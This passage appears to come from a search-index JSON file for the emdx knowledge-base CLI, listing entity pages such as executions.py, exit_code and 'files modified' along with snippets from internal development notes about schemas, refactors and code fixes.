rendering)\\n-</code>handle...</p> </li> <li> <p>#1835 Architecture Analysis: EMDX Control Center v5 Implementation   Section: Current Architecture Strengths</p> <p>...view, edit, delete</p> </li> <li><code>agents.py</code> (800+ lines) - agent management and execution</li> <li><code>executions.py</code> (500+ lines) - execution monitoring</li> <li> <p><code>tags.py</code> (400+ lines) - tag management</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...All necessary</p> </li> <li>briefing.py: 1 bug to fix</li> <li>compact.py: All necessary</li> <li> <p>executions.py: 1 special case (tri-state bool)</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...erialization | | <code>emdx/models/tasks.py</code> | 2 | 2 | TaskDict fields | | <code>emdx/models/executions.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/database/groups.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/utils/output.py</code> | 1 | 0 | JSON serialization (keep) | | `emdx/utils/retry.p...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...GINEERED - Analysis dashboard. Mostly read-only views of maintain.py data. | | executions.py | 561 | SUPPORT - Execution history viewer. Useful but could be simpler. | | groups.py | 452 | UNDERUTILIZED** - Document grouping system. Adds complexit...</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Changes Made</p> <p>...(Issue #8)</p> </li> <li>trash.py: \"Manage deleted documents (trash, restore, purge)\"</li> <li>executions.py: \"Monitor and manage execution processes\"</li> <li>gist.py: \"Create and manage GitHub gists from documents\"</li> <li>browse.py: \"Browse documents and view statistics\"</li> </ul>"},{"location":"entities/executionspy/#emdx-models-bug-audit-report","title":"EMDX Models Bug Audit Report","text":"<p>Date: 2026-02-15 Scope: emdx/models/ directory (documents.py, tags.py, tasks.py, categories.py, executions.py)</p>"},{"location":"entities/executionspy/#43-consolidate-time-formatting-low","title":"4.3 Consolidate Time Formatting (LOW)","text":""},{"location":"entities/executionspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>typer apps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>help text</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>added help text</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>taskupdatekwargs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>gist.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=5.3)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=5.3)</li> <li><code>categories.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.2)</li> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.1)</li> <li><code>allowed_execution_columns</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.1)</li> </ul>"},{"location":"entities/exitcode/","title":"exit_code","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/exitcode/#documents-10","title":"Documents (10)","text":"<ul> <li>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary <p>...m <code>SingleResult.to_dict()</code>: <code>task_id</code>, <code>doc_id</code>, <code>output_doc_id</code>, <code>execution_id</code>, <code>exit_code</code>, <code>success</code>, <code>duration_seconds</code>, <code>duration</code></p> </li> <li>Note about optional fields (<code>pr_url</code>, <code>branch_name</code>, <code>error</code>)</li> <li> <p>Parallel task JSON output structure showing field...</p> </li> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...ile running) | | <code>log_file</code> | TEXT NOT NULL | Path to the delegate's log file | | <code>exit_code</code> | INTEGER (nullable) | Process exit code (NULL while running) | | <code>working_dir</code> | TEXT (nullable) | Working directory / worktree path | | <code>pid</code> | INTEGER (nullable)...</p> </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...input_tokens<code>,</code>output_tokens<code>,</code>cost_usd<code>,</code>execution_time_ms<code>,</code>error_message<code>,</code>exit_code<code>,</code>cli_tool`</p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Changes</p> <p>...nt), <code>cost_usd</code> (float), <code>execution_time_ms</code> (int), <code>error_message</code> (str | None), <code>exit_code</code> (int | None), <code>cli_tool</code> (str)</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <ul> <li><code>AgentExecutionDict</code>: Agent execution data used by <code>AgentExecutionItem</code> in the activity view. Fields include <code>id</code>, <code>doc_id</code>, <code>doc_title</code>, <code>status</code>, <code>started_at</code>, <code>completed_at</code>, <code>log_file</code>, <code>exit_code</code>, <code>working_dir</code>, <code>cost_usd</code>, <code>tokens_used</code>.</li> </ul> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 1. Executions Table (<code>models/executions.py</code>)</p> <p>...TIMESTAMP | When execution finished | | <code>log_file</code> | TEXT | Path to log file | | <code>exit_code</code> | INTEGER | Process exit code | | <code>working_dir</code> | TEXT | Working directory | | <code>pid</code> | INTEGER | Process ID for zombie detection | | <code>last_heartbeat</code> | TIMESTAMP |...</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Overlap Between Delegate's Task Tracking and Task System</p> <p>...put | <code>output_doc_id</code> | N/A (just tracks completion) | | Error | <code>error</code> column | <code>exit_code</code> |</p> </li> </ul>"},{"location":"entities/exitcode/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.4)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>task redo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>executions table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>log_file</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=6.1)</li> <li><code>mapping[str, any]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>`emdx/services/unified_executor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/failed/","title":"failed","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2025-07-12</p>"},{"location":"entities/failed/#documents-12","title":"Documents (12)","text":"<ul> <li>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary <p>...lds from <code>ParallelResult.to_dict()</code>: <code>parent_task_id</code>, <code>task_count</code>, <code>succeeded</code>, <code>failed</code>, <code>doc_ids</code>, <code>tasks</code> array, <code>total_duration_seconds</code>, <code>total_duration</code></p> </li> <li> <p>Note about <code>synthesis</code> object when <code>--synthesize</code> is used</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (A) COULD MOVE TO A HOOK</p> <p>...ites the ID to a known path, but it's fragile. | | 20 | Task status update (done/failed) | 103\u2013140, 536\u2013537, 554, 571, 585 | SessionEnd | <code>session-end.sh</code> already does <code>emdx task done</code>. The launcher duplicates this by calling `_safe_update_task(st...</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: 3. Synthesis Mode (<code>--synthesize</code>)</p> <p>After parallel execution:</p> </li> <li>Combines all task outputs into a single document</li> <li>Runs an additional synthesis task via <code>_run_single()</code></li> <li>Includes failure context if some tasks failed</li> <li> <p>Reports \"partial\" status when some tasks fail</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...ription | | <code>status</code> | TEXT | \"open\" | Current state: open, active, blocked, done, failed | | <code>priority</code> | INTEGER | 3 | Priority level (1=highest, 5=lowest) | | <code>gameplan_id</code> | INTEGER | NULL | FK to documents (optional gameplan) | | <code>project</code> | TEXT | N...</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Agent Patterns</p> <p>Tagging Approach:</p> </li> <li>Passed via <code>--tags</code> flag at creation time</li> <li>Status tags: <code>active</code>, <code>done</code>, <code>blocked</code>, <code>failed</code></li> <li>Content type tags: <code>analysis</code>, <code>gameplan</code>, <code>bugfix</code>, <code>security</code></li> <li> <p>Never applied incrementally \u2014 set once at save time</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...tle</p> </li> <li><code>description</code>: Task description</li> <li><code>status</code>: open | active | blocked | done | failed</li> <li><code>priority</code>: 1-5 (default 3)</li> <li><code>gameplan_id</code>: Links to documents table</li> <li><code>project</code>: Project name</li> <li><code>current_step</code>: Resume checkpoint</li> <li> <p><code>created_at</code>, <code>updated_at</code>, `...</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Core Components</p> <p>...t_task_id` for grouped operations</p> </li> <li>Status workflow: <code>open</code> \u2192 <code>active</code> \u2192 <code>done</code> | <code>failed</code> | <code>blocked</code></li> <li>Priority levels 1-5 with gameplan linkage</li> <li> <p>Fields for delegate activity: <code>prompt</code>, <code>type</code>, <code>execution_id</code>, <code>output_doc_id</code>, <code>source_doc_id</code>, <code>seq</code>, `...</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Delegate Activity Tracking Fields (added in migration 034)</p> <p>...LL | FK to tasks (if this is a retry) | | <code>error</code> | TEXT | NULL | Error message if failed | | <code>tags</code> | TEXT | NULL | Comma-separated tags |</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: EMDX Task CLI Commands Analysis</p> </li> <li> <p>#452 Minimal Tag Taxonomy - Space-Efficient   Section: Core Tags (Single Words Only)</p> </li> <li><code>success</code> - Worked as intended</li> <li><code>failed</code> - Didn't work</li> <li> <p><code>partial</code> - Mixed results</p> </li> <li> <p>#451 Tag Taxonomy for EMDX Project Management   Section: Core Workflow Tags</p> </li> <li><code>successful</code> - Achieved intended results</li> <li><code>partial-success</code> - Some objectives met</li> <li><code>failed</code> - Did not achieve objectives</li> <li> <p><code>learned</code> - Valuable lessons extracted</p> </li> <li> <p>#450 Claude Code Tag System Enhancement Ideas   Section: Claude Code Tag System Enhancement Ideas</p> <p>...ags:</p> </li> <li><code>gameplan</code>, <code>analysis</code>, <code>todo</code>, <code>in-progress</code>, <code>completed</code></li> <li><code>successful</code>, <code>failed</code>, <code>blocked</code>, <code>needs-review</code></li> <li><code>priority-high</code>, <code>priority-medium</code>, <code>priority-low</code></li> </ul>"},{"location":"entities/failed/#status-system","title":"Status System","text":"<p>Valid statuses: <code>open</code>, <code>active</code>, <code>blocked</code>, <code>done</code>, <code>failed</code> Icons: \u25cb (open), \u25cf (active), \u26a0 (blocked), \u2713 (done), \u2717 (failed)</p>"},{"location":"entities/failed/#outcomes-success-tracking","title":"Outcomes (Success Tracking)","text":""},{"location":"entities/failed/#outcomes-success-tracking_1","title":"Outcomes &amp; Success Tracking","text":""},{"location":"entities/failed/#related-entities","title":"Related Entities","text":"<ul> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>task runner</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>task lifecycle</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>single tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>blocked</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.8)</li> <li><code>partial</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>message</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>active</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/features/","title":"features","text":"<p>Type: heading | Mentioned in: 8 documents | First seen: 2025-07-07</p>"},{"location":"entities/features/#documents-8","title":"Documents (8)","text":"<ul> <li>#6411 Delegate: Implement 'emdx briefing' command. This is a new command tha <p>This provides a quick overview of what happened across tasks, documents, and delegate executions since a configurable cutoff time. ## Usage</p> </li> </ul> <p>```bash</p>"},{"location":"entities/features/#default-last-24-hours","title":"Default: last 24 hours","text":"<p>emdx briefing</p>"},{"location":"entities/features/#custom-time-range","title":"Custom time range","text":"<p>emdx briefing --since '2 days ago' emdx b...</p> <ul> <li>#289 README </li> </ul> <p>A powerful command-line tool for managing your personal knowledge base with SQLite full-text search, Git integration, and a beautiful terminal interface. ## Features</p> <ul> <li> <p>\ud83d\ude80 Unified CLI: Single <code>emdx</code> ...</p> </li> <li> <p>#169 Clauding Cleanup and Reorganization Plan   Section: \ud83c\udfaf Final Decision: Keep the Scale Version</p> <p>...the base functions anyway (no duplication)</p> </li> <li>Zero performance overhead for unused features</li> <li>The search improvements (previews, fuzzy search) are genuinely useful</li> <li> <p>Future-proof without complexity</p> </li> <li> <p>#178 README</p> </li> </ul> <p>A set of Fish shell functions for managing documents stored in PostgreSQL with beautiful markdown rendering via mdcat. ## Features</p> <ul> <li>Store markdown documents in PostgreSQL</li> <li> <p>View documents with syntax...</p> </li> <li> <p>#184 claude-knowledge-gist   Section: Architecture Decisions</p> <p>...ns</p> </li> <li>Fish over Bash - Better completions, cleaner syntax, amazing interactive features</li> <li>Direct SQL over ORM - Maximum performance, full control over queries</li> <li> <p>Trigram indexes - Handles typos and fuzzy matching efficiently</p> </li> <li> <p>#6166 Delegate: Analyze how tasks integrate with cascade. Read emdx/commands [5/15]   Section: Current State</p> <p>...utions` table</p> </li> <li>Automation: Via <code>emdx delegate</code> which creates task records</li> <li>Features: </li> <li>Dependency management with cycle detection</li> <li>Gameplan association (<code>gameplan_id</code>)</li> <li>Progress logging (<code>task_log</code> table)</li> <li> <p>Ready-task queries (open + al...</p> </li> <li> <p>#267 Claude Implementation Comparison   Section: \ud83c\udfd7\ufe0f Architecture Differences</p> <p>...full-text search</p> </li> <li>Best for: Personal knowledge base with &lt; 100K documents</li> <li>Features: </li> <li>Git project detection</li> <li>Access tracking (view count, last accessed)</li> <li> <p>Simple and reliable</p> </li> <li> <p>#156 Claude-KB Project Recommendation - Split Strategy   Section: Two Distinct Projects</p> <p>...ude-KB (The Gem) What: Universal knowledge capture for Claude workflows Core Features:</p> </li> <li><code>claude-save</code> - Save any markdown file with one command</li> <li><code>claude-find</code> - Full-text search across everything  </li> <li><code>claude-note</code> - Quick capture for thoughts</li> <li>`c...</li> </ul>"},{"location":"entities/features/#emdx-documentation-index-management-system","title":"emdx - Documentation Index Management System","text":""},{"location":"entities/features/#postgresql-document-management-for-fish-shell","title":"PostgreSQL Document Management for Fish Shell","text":""},{"location":"entities/features/#related-entities","title":"Related Entities","text":"<ul> <li><code>quick capture</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>private_data.documents</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>installation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>storage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>executions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=3.4)</li> <li><code>tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=2.9)</li> </ul>"},{"location":"entities/files-modified/","title":"files modified","text":"<p>Type: heading | Mentioned in: 31 documents | First seen: 2026-01-11</p>"},{"location":"entities/files-modified/#documents-31","title":"Documents (31)","text":"<ul> <li>#6790 Delegate: Execute the following document:</li> </ul>"},{"location":"entities/files-modified/#claude-save-hook-implemen-33","title":"Claude-Save Hook Implemen [3/3]","text":"<p>Successfully implemented the Claude-Save Hook as described in the game plan document. Here's what was done:</p>"},{"location":"entities/files-modified/#summary","title":"Summary","text":""},{"location":"entities/files-modified/#files-modified_1","title":"Files Modified","text":"<ol> <li> <p><code>~/.claude/hooks/claude-save-fixer.sh</code> \u2014 Upgraded from diagnostic-only to active command transformatio...</p> </li> <li> <p>#6585 Delegate: Remove any remaining references to 'cursor' or 'Cursor' in c [2/2]</p> <p>SQLite <code>cursor</code> objects and TUI cursor navigation references were correctly preserved. ## Changes Made</p> </li> </ol>"},{"location":"entities/files-modified/#files-modified_2","title":"Files Modified","text":"<ol> <li>emdx/services/unified_executor.py \u2014 6 changes</li> <li>Removed \"Cursor\" from module docstring</li> <li> <p>Changed \"Works with both...</p> </li> <li> <p>#6579 Delegate: Add a TypedDict for the dict returned by ExecutionResult.to_</p> </li> </ol>"},{"location":"entities/files-modified/#add-typeddict-for-executionresultto_dict","title":"Add TypedDict for ExecutionResult.to_dict()","text":""},{"location":"entities/files-modified/#changes","title":"Changes","text":"<p>Added <code>ExecutionResultDict</code> TypedDict to <code>emdx/services/types.py</code> and annotated the return type of <code>ExecutionResult.to_dict()</code> in <code>emdx/services/unified_executor.py</code>. ### Files Modified</p> <ol> <li> <p>*...</p> </li> <li> <p>#6557 Delegate: Document #6544 (Delegate Enhancement Gameplans [4/5]):</p> </li> </ol>"},{"location":"entities/files-modified/#im","title":"Im","text":"<p><code>emdx/commands/wrapup.py</code> - Main command implementation (~225 lines)    - <code>_collect_activity(hours)</code>: Gathers tasks, docs, delegate tasks, and execution stats    - <code>_build_synthesis_prompt(activity)</code>: Builds the AI prompt from activity data    - ...</p> <ul> <li>#6554 Implementation: Add Recent Failures to emdx prime (Issue #FEAT-7)   Section: Output Examples </li> <li><code>emdx/models/tasks.py</code> \u2014 Added <code>get_recent_failures()</code> function</li> <li><code>emdx/commands/prime.py</code> \u2014 Added RECENT FAILURES section to both output modes</li> <li> <p><code>tests/test_commands_prime.py</code> \u2014 Added tests for new functionality</p> </li> <li> <p>#6537 Delegate: Document #6526 (Gameplan: Single-click highlights, double-cl</p> <p>Enter key on tree item \u2192 fullscreen opens</p> </li> <li>Keyboard navigation (j/k) \u2192 still works</li> </ul>"},{"location":"entities/files-modified/#files-modified_3","title":"Files Modified","text":""},{"location":"entities/files-modified/#files-modified_4","title":"Files Modified","text":"<ul> <li><code>emdx/ui/activity/activity_tree.py</code> \u2014 click override, double-click detection, DoubleClicked message</li> <li> <p><code>emdx/ui/activity/activity_view.py</code> \u2014 D...</p> </li> <li> <p>#6524 Delegate: FEAT-5 Smart Priming Implementation</p> </li> </ul>"},{"location":"entities/files-modified/#implementation-feat-5-smart-priming-gaps","title":"Implementation: FEAT-5 Smart Priming Gaps","text":""},{"location":"entities/files-modified/#summary_1","title":"Summary","text":"<p>Implemented Phase 1 (Git Context) and Phase 2 (Key Docs) of the FEAT-5 Smart Priming gameplan. ## Changes Made</p>"},{"location":"entities/files-modified/#phase-1-git-context-in-prime","title":"Phase 1: Git Context in Prime","text":"<p>Added <code>_get_git_context()</code> function to `emdx/c...</p> <ul> <li>#6481 Delegate: Kink 4: Make delegate --synthesize resilient to agent failur [1/3] <p>Updated <code>_run_single</code> failure return (line 512-517)</p> </li> </ul> <p>When a task fails, now returns a <code>SingleResult</code> with <code>success=False</code> and the error message:</p> <p>```python if not result.success:     sys.stderr.write(f\"delegate: task failed: {result.error_message}\\n\"...</p> <ul> <li>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary </li> <li>emdx/database/documents.py</li> <li>emdx/database/groups.py</li> <li>emdx/models/executions.py</li> <li>emdx/models/tags.py</li> <li> <p>emdx/models/tasks.py</p> </li> <li> <p>#6391 Delegate: Fix UI race conditions. Task #625: In emdx/ui/document_brows</p> <p>The same query with different filters would return wrong cached results. Solution: Updated the cache key to include the full filter state: ```python filters_str = \",\".join(sorted(self._state.active_filters)) if self._state.active_filters else \"\" ...</p> </li> <li> <p>#6355 Delegate: Document #6349 (Service Layer &amp; Cascade Refactor Plan): Implementation Complete   Section: Changes Made</p> </li> <li><code>emdx/services/cascade_service.py</code> (+43 lines)</li> <li> <p><code>emdx/ui/activity/activity_data.py</code> (-24 lines, +15 lines)</p> </li> <li> <p>#6352 Delegate: Rebase the feat/auto-linking branch onto main and resolve al [3/5]   Section: Actions Taken</p> </li> <li> <p><code>emdx/database/migrations.py</code> - Renumbered migration and resolved conflict</p> </li> <li> <p>#6339 Delegate: R2: Add retry logic for network/IO operations   Section: R2: Add Retry Logic for Network/IO Operations</p> </li> <li><code>emdx/commands/gist.py</code>: Applied retry to GitHub API calls:</li> <li><code>_get_gh_auth_token()</code>: Retry on gh auth token retrieval</li> <li><code>_run_gh_gist_create()</code>: Retry on gist creation</li> <li> <p><code>_run_gh_gist_edit()</code>: Retry on gist update</p> </li> <li> <p>#6296 DEBT-28: O(n\u00b2) Duplicate Detection - Already Fixed   Section: Test Results</p> </li> <li> <p>#6288 Delegate: DEBT-13: Add retry logic for network/IO operations   Section: Design Decisions</p> </li> <li><code>pyproject.toml</code> - Added tenacity dependency</li> <li><code>emdx/utils/retry.py</code> - New retry utility module</li> <li> <p><code>emdx/services/ask_service.py</code> - Added retry to Claude API calls...</p> </li> <li> <p>#6280 Delegate: DEBT-5: Fix silent exception handlers</p> </li> </ul>"},{"location":"entities/files-modified/#files-modified_5","title":"Files Modified","text":""},{"location":"entities/files-modified/#files-modified_6","title":"Files Modified","text":""},{"location":"entities/files-modified/#files-modified_7","title":"Files Modified","text":""},{"location":"entities/files-modified/#files-modified_8","title":"Files Modified","text":""},{"location":"entities/files-modified/#files-modified_9","title":"Files Modified","text":"<p>None - implementation was already complete</p>"},{"location":"entities/files-modified/#files-modified_10","title":"Files Modified","text":""},{"location":"entities/files-modified/#debt-5-fix-silent-exception-handlers","title":"DEBT-5: Fix Silent Exception Handlers","text":""},{"location":"entities/files-modified/#summary_2","title":"Summary","text":"<p>Fixed all instances of silent exception handlers (<code>except Exception: pass</code> patterns) across the emdx/ directory by adding proper logging with context about what failed. ## Files Modified</p>"},{"location":"entities/files-modified/#comman","title":"Comman...","text":"<ul> <li>#6274 DEBT-3: Fix dependency debt - remove python-dotenv, update ruff, remove black   Section: Changes Made </li> <li><code>pyproject.toml</code> - Removed dependencies and black config section</li> <li> <p><code>poetry.lock</code> - Updated automatically via <code>poetry lock</code></p> </li> <li> <p>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project)</p> <p>Added Environment Variable Documentation</p> </li> <li><code>ENV_VARS</code> dict documenting all known env vars</li> <li><code>BOOL_TRUTHY_VALUES</code> for consistent boolean parsing</li> <li>Updated <code>main.py</code> to use <code>BOOL_TRUTHY_VALUES</code></li> </ul>"},{"location":"entities/files-modified/#files-modified_11","title":"Files Modified","text":""},{"location":"entities/files-modified/#6-additional-constants","title":"6. Additional Constants","text":"<ul> <li> <p><code>DEFAULT_EDITOR = \"nano\"</code> (...</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]</p> <p>Added Validation for Empty Content (Issue #6)</p> </li> <li><code>cascade add</code>: Validates content is not empty before saving</li> <li><code>core save</code>: Validates content is not empty after reading input</li> <li> <p>Returns standardized error message: `[red]Error: Content cannot be empty[/...</p> </li> <li> <p>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]</p> <p>Added <code>_validate_discovery_command()</code> function:</p> </li> <li>Uses <code>shlex.split()</code> to safely parse commands</li> <li>Validates base command against allowlist</li> <li> <p>Restricts git to safe subcommands only</p> </li> <li> <p>Updated <code>_run_discovery()</code>:</p> </li> <li> <p>Now calls valida...</p> </li> <li> <p>#6252 Delegate: Remove dead code (unused imports, deprecated execute_claude_sync)</p> <p>Stub Functions Analysis</p> </li> </ul> <p>Most <code>pass</code> statements in the codebase are legitimate: - Exception handlers (catching and ignoring expected errors) - Protocol/ABC method stubs with docstrings - Empty blocks for try/except cleanup patterns</p> <p>No dead stub func...</p> <ul> <li>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made </li> <li><code>emdx/models/executions.py</code> - Model sync and query refactor</li> <li><code>emdx/database/migrations.py</code> - Migrations 037, 038, and validator</li> <li> <p><code>emdx/database/groups.py</code> - Security documentation</p> </li> <li> <p>#6208 Delegate: Fix PR #449 (Dream Journal): Needs cleanup and tests. Review [3/8]   Section: Changes Made</p> </li> <li><code>emdx/commands/dream.py</code> - Removed unused imports</li> <li> <p><code>tests/test_dream.py</code> - New test file (18 tests)</p> </li> <li> <p>#5039 Parallel Fix Track Results - LSH Duplicate Detection   Section: Track 1: LSH/MinHash Duplicate Detection Performance Fix</p> </li> <li><code>emdx/services/duplicate_detector.py</code> - 264 lines changed (+579/-38)</li> <li><code>pyproject.toml</code> - Added datasketch dependency</li> <li> <p><code>tests/test_duplicate_detector.py</code> - 352 lines (new test file)</p> </li> <li> <p>#6525 Delegate: FEAT-7 Ask-KB Improvements Implementation   Section: Phase 1: Core Filters</p> <p>Files Modified:</p> </li> <li><code>emdx/commands/ask.py</code> - Added CLI options</li> <li> <p><code>emdx/services/ask_service.py</code> - Added filter helper</p> </li> <li> <p>#6362 Delegate: DEBT-5: Fix silent exception handlers in the emdx codebase.  [2/3]   Section: DEBT-5: Fix Silent Exception Handlers</p> </li> 